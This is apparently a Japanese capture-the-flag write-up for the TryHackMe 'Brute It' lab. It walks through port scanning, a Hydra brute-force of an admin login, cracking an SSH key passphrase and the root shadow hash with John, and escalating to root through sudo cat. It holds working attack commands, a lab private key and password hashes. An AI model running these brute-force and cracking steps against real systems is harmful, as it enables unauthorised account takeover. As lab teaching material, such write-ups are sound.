@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Brute It Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Brute It</h1>
+    <p>管理画面ブルートフォース、SSH、shadow クラック、su による root 化。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p><code>--script=vuln</code></p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ nmap 10.48.143.111 --script=vuln
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 11:17 +0900
+Nmap scan report for 10.48.143.111
+Host is up (0.13s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-cookie-flags: 
+|   /admin/: 
+|     PHPSESSID: 
+|       httponly flag not set
+|   /admin/index.php: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /admin/: Possible admin folder
+|_  /admin/index.php: Possible admin folder
+
+Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
+
+</code></pre>
+<p><code>/admin</code>ディレクトリが攻めどころかな？</p>
+<p><code>-sV -sC</code></p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ nmap -sV -sC -oX scan.xml -T4 -p- 10.48.143.111
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 11:17 +0900
+Nmap scan report for 10.48.143.111
+Host is up (0.13s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 81.57 seconds
+</code></pre>
+<p><code>feroxbuster</code></p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ feroxbuster -u http://10.48.143.111    
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.48.143.111/
+ 🚩  In-Scope Url          │ 10.48.143.111
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      314c http://10.48.143.111/admin =&gt; http://10.48.143.111/admin/
+200      GET       15l       74w     6147c http://10.48.143.111/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://10.48.143.111/
+301      GET        9l       28w      320c http://10.48.143.111/admin/panel =&gt; http://10.48.143.111/admin/panel/
+[####################] - 2m     90011/90011   0s      found:4       errors:2      
+[####################] - 2m     30000/30000   323/s   http://10.48.143.111/ 
+[####################] - 2m     30000/30000   324/s   http://10.48.143.111/admin/ 
+[####################] - 88s    30000/30000   340/s   http://10.48.143.111/admin/panel/ 
+</code></pre>
+<p><code>/admin</code>以外めぼしいものは見つからず</p>
+<p><code>searchsploit</code>でエクスプロイトを探したがこれも見つからず</p>
+<hr>
+<p>adminページを見てみるとUSERNAMEとPASSWORDの入力フォームがあった</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ curl http://10.48.143.111/admin/
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+    &lt;title&gt;Admin Login Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;main&quot;&gt;
+        &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+            &lt;h1&gt;LOGIN&lt;/h1&gt;
+
+
+            &lt;label&gt;USERNAME&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;
+
+            &lt;label&gt;PASSWORD&lt;/label&gt;
+            &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;
+
+            &lt;button type=&quot;submit&quot;&gt;LOGIN&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Hey john, if you do not remember, the username is admin --&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ 
+</code></pre>
+<p>どうみてもここにbruteforceだ</p>
+<p>試しに適当なパスワードを送信してみる<br>
+これはGUIで入力することもできるがCLIからもできる<br>
+<code>curl -X POST -d "user=admin&amp;pass=test" http://10.48.143.111/admin/</code>を使う</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+└─$ curl -X POST -d &quot;user=admin&amp;pass=test&quot; http://10.48.143.111/admin/
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+    &lt;title&gt;Admin Login Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;main&quot;&gt;
+        &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+            &lt;h1&gt;LOGIN&lt;/h1&gt;
+
+
+            &lt;p&gt;Username or password invalid&lt;/p&gt;
+
+
+            &lt;label&gt;USERNAME&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;
+
+            &lt;label&gt;PASSWORD&lt;/label&gt;
+            &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;
+
+            &lt;button type=&quot;submit&quot;&gt;LOGIN&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Hey john, if you do not remember, the username is admin --&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><code>&lt;body&gt;</code>に<code>&lt;p&gt;Username or password invalid&lt;/p&gt;</code>が追記されて返ってきた<br>
+この文言をログイン失敗時の目印としてヒドラを実施する<br>
+<code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.143.111 http-post-form "/admin/:user=^USER^&amp;pass=^PASS^:F=Username or password invalid"</code></p>
+<h3>コマンドの構成要素のおさらい</h3>
+<ul>
+<li>
+<p><strong><code>-l admin</code></strong>: ユーザー名を <code>admin</code> に固定します。</p>
+</li>
+<li>
+<p><strong><code>-P /usr/share/wordlists/rockyou.txt</code></strong>: 試行するパスワードのリストを指定します。（※もし <code>rockyou.txt</code> が解凍されておらず <code>.gz</code> のままであれば、実行前に <code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code> で解凍してください）</p>
+</li>
+<li>
+<p><strong><code>10.48.143.111</code></strong>: ターゲットのIPアドレスです。</p>
+</li>
+<li>
+<p><strong><code>http-post-form</code></strong>: POSTメソッドで送信されるWebフォームを攻撃するためのHydraのモジュールです。</p>
+</li>
+<li>
+<p><strong><code>"/admin/:user=^USER^&amp;pass=^PASS^:F=Username or password invalid"</code></strong>: <code>"</code> の中はコロン（<code>:</code>）で3つのブロックに分かれています。</p>
+<ol>
+<li>
+<p><strong>パス</strong>: <code>/admin/</code></p>
+</li>
+<li>
+<p><strong>リクエストボディ（パラメータ）</strong>: HTMLの <code>name</code> 属性に合わせて <code>user=^USER^&amp;pass=^PASS^</code> と記述します。実行時、<code>^USER^</code> には <code>admin</code> が、<code>^PASS^</code> には辞書の単語が次々と代入されて送信されます。</p>
+</li>
+<li>
+<p><strong>失敗の判定基準</strong>: <code>F=Username or password invalid</code> とすることで、レスポンスの中にこの文字列が含まれていれば「失敗」、含まれていなければ「成功」とHydraが自動判定します（<code>F=</code> は Failure の意味です）。</p>
+</li>
+</ol>
+</li>
+</ul>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.143.111 http-post-form &quot;/admin/:user=^USER^&amp;pass=^PASS^:F=Username or password invalid&quot;
+Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 11:34:33
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.48.143.111:80/admin/:user=^USER^&amp;pass=^PASS^:F=Username or password invalid
+[80][http-post-form] host: 10.48.143.111   login: admin   password: xavier
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 11:35:00
+</code></pre>
+<p><code>admin:xavier</code>が取れた。ザビエル？</p>
+<p>GUIからログインしたところRSAkeyをゲットした<br>
+sshで使えるんだっけこれ</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
+
+JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
+UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
+BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
+HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
++Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
+UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
+VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
+vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
+/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
+y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
+yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
+oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
+onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
+zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
+wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
+f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
+uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
+O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
+C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
+mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
+OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
+6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
+zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
+miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
+x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>CLIからも見たいが遷移してくれなかった</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+└─$ curl -X POST -d &quot;user=admin&amp;pass=xavier&quot; http://10.48.143.111/admin/
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+    &lt;title&gt;Admin Login Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;main&quot;&gt;
+        &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+            &lt;h1&gt;LOGIN&lt;/h1&gt;
+
+
+            &lt;label&gt;USERNAME&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;
+
+            &lt;label&gt;PASSWORD&lt;/label&gt;
+            &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;
+
+            &lt;button type=&quot;submit&quot;&gt;LOGIN&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Hey john, if you do not remember, the username is admin --&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>これを解決するには</p>
+<table>
+<thead>
+<tr>
+<th><strong>目的</strong></th>
+<th><strong>実行するコマンドの例</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>サーバーの応答（ヘッダ情報）を覗き見して、Cookieや移動先の指示が出ているか確認する</strong></td>
+<td><code>curl -i -X POST -d "user=admin&amp;pass=xavier" http://10.48.143.111/admin/</code></td>
+</tr>
+<tr>
+<td><strong>ブラウザの挙動を再現し、Cookieを保存・送信しながらリダイレクト先に移動する</strong></td>
+<td><code>curl -c cookie.txt -b cookie.txt -L -X POST -d "user=admin&amp;pass=xavier" http://10.48.143.111/admin/</code></td>
+</tr>
+<tr>
+<td>これを実施する</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+└─$ curl -c cookie.txt -b cookie.txt -L -X POST -d &quot;user=admin&amp;pass=xavier&quot; http://10.48.143.111/admin/
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Panel&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Hello john, finish the development of the site, here's your &lt;a href=&quot;id_rsa&quot;&gt;RSA private key.&lt;/a&gt;&lt;/h1&gt;
+    &lt;br&gt;&lt;br&gt;
+    &lt;p&gt;THM{brut3_f0rce_is_e4sy}&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/Downloads]
+└─$ 
+</code></pre>
+<p>あとは秘密鍵を格納してそれを使ってsshログインすればよい</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ vim id_rsa                  
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ ll
+合計 8
+-rw-rw-r-- 1 rkametani rkametani 1766  5月 14 11:51 id_rsa
+-rw-rw-r-- 1 rkametani rkametani 3581  5月 14 11:18 scan.xml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ chmod 600 id_rsa                
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ ll
+合計 8
+-rw------- 1 rkametani rkametani 1766  5月 14 11:51 id_rsa
+-rw-rw-r-- 1 rkametani rkametani 3581  5月 14 11:18 scan.xml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ ssh -i id_rsa john@10.48.143.111
+The authenticity of host '10.48.143.111 (10.48.143.111)' can't be established.
+ED25519 key fingerprint is: SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.48.143.111' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'id_rsa': 
+</code></pre>
+<p><code>id_rsa</code>を作成して、パーミッションを変更したのだが<br>
+パスフレーズを求められた<br>
+秘密鍵ファイルからパスワード解析用のハッシュ情報を抽出してパスフレーズの特定という作業を実施する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ ssh2john id_rsa &gt; id_rsa.hash   
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ ls
+id_rsa  id_rsa.hash  scan.xml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rockinroll       (id_rsa)     
+1g 0:00:00:00 DONE (2026-05-14 11:56) 11.11g/s 806755p/s 806755c/s 806755C/s saloni..rock14
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ 
+</code></pre>
+<p><code>rockinroll</code>がパスフレーズだ</p>
+<p>再度sshログインを試みる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ ssh -i id_rsa john@10.48.143.111
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May 14 02:57:19 UTC 2026
+
+  System load:  0.0                Processes:           109
+  Usage of /:   25.7% of 19.56GB   Users logged in:     0
+  Memory usage: 46%                IP address for ens5: 10.48.143.111
+  Swap usage:   0%
+
+
+63 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
+john@bruteit:~$ ls
+user.txt
+john@bruteit:~$ cat user.txt
+THM{a_password_is_not_a_barrier}
+john@bruteit:~$ 
+</code></pre>
+<p>つぎは権限昇格</p>
+<pre><code class="language-bash">john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+john@bruteit:~$ sudo cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+thm:x:1000:1000:THM Room:/home/thm:/bin/bash
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+john:x:1001:1001:john,,,:/home/john:/bin/bash
+john@bruteit:~$ sudo cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
+sshd:*:18489:0:99999:7:::
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
+john@bruteit:~$ 
+</code></pre>
+<p><code>sudo -l</code>を実施すると<code>/bin/cat</code>がNOPASSWDで使えるらしかったので<code>/etc/passwd</code>と<code>/etc/shadow</code>を見た<br>
+shadowの中にある<code>root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::</code>これ確か<code>$6</code>がSHA512の識別子でクラック可能だった気がする</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::' &gt; hash.txt
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ cat hash.txt                      
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football         (root)     
+1g 0:00:00:00 DONE (2026-05-14 13:06) 11.11g/s 11377p/s 11377c/s 11377C/s 123456..bethany
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bruteIt]
+└─$ 
+</code></pre>
+<p><code>football</code>が取れた<br>
+これはrootのパスワードであるのでそのまま入れる</p>
+<pre><code class="language-bash">john@bruteit:~$ su
+Password: 
+root@bruteit:/home/john# whoami
+root
+root@bruteit:/home/john# find / -name root.txt 2&gt;/dev/null
+/root/root.txt
+root@bruteit:/home/john# cat /root/root.txt 
+THM{pr1v1l3g3_3sc4l4t10n}
+root@bruteit:/home/john# 
+</code></pre>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/bruteit">https://tryhackme.com/room/bruteit</a></p>
+  </footer>
+</body>
+</html>
